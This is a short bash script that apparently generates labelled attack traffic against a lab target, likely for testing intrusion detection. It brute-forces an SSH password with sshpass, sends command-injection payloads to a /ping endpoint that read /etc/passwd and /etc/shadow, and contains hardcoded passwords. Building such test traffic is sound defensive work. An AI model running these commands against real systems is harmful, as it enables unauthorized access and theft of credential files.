#!/bin/bash
TARGET_IP="$1"
echo "=== SCENARIO2_START $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="

echo "--- [20] SSH brute force that SUCCEEDS: wordlist ending in the real password ---"
for p in summer123 winter123 password1 qwerty2025 Winter2025; do
  timeout 5 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "svc_backup@$TARGET_IP" "whoami; hostname" 2>/dev/null
done

echo "--- [21] Command injection against the vulnerable /ping endpoint ---"
curl -s -m 5 "http://$TARGET_IP/ping?host=127.0.0.1%3Bwhoami" >/dev/null
curl -s -m 5 "http://$TARGET_IP/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd" >/dev/null
curl -s -m 5 "http://$TARGET_IP/ping?host=%60id%60" >/dev/null

echo "--- [22] Sensitive file access attempt via traversal on new endpoint ---"
curl -s -m 5 "http://$TARGET_IP/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fshadow" >/dev/null

echo "--- [23] Benign padding: more normal web + SSH activity ---"
for q in widget gadget mug; do
  curl -s -m 5 "http://$TARGET_IP/search?q=$q" >/dev/null
done
timeout 8 sshpass -p "Sup3rS3cure!2026" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "testuser@$TARGET_IP" "echo ok" 2>/dev/null

echo "=== SCENARIO2_END $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="
